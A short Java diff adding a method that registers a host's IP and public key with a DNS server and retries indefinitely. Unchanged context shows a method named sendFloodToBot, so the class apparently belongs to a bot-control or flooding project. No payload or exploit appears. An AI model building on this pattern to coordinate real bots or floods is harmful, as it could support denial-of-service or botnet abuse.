@@ -58,7 +58,35 @@ public class CecRequest {
 		}
 	}
 	
-	
+	/**
+	 * @param dnsUrl
+	 * @param myIp
+	 * @param myPublicKey
+	 * @return
+	 */
+	public Boolean sendInfoToDnsServer(String dnsUrl, IP myIp, String myPublicKey) {
+		Pairs<IP, String> data = new Pairs<>();
+		data.setValue1(myIp);
+		data.setValue2(myPublicKey);
+		Boolean response = false;
+		while (true) {
+			try {
+				String url = HTTP + dnsUrl + "/alter";
+				System.out.println("url " + url);
+				response = restTemplate.postForObject(url, data, response.getClass());
+				if (response != null)
+					System.out.println(response);
+				return response;
+			} catch (Exception e) {
+				System.out.println("Errore Aggiornamento DNS");
+				try {
+					Thread.sleep(WAIT_RANGE);
+				} catch (InterruptedException ex) {
+					ex.printStackTrace();
+				}
+			}
+		}
+	}
 	@Async
 	public Boolean sendFloodToBot(String ipBot,String msg) {
 		Boolean response=false;
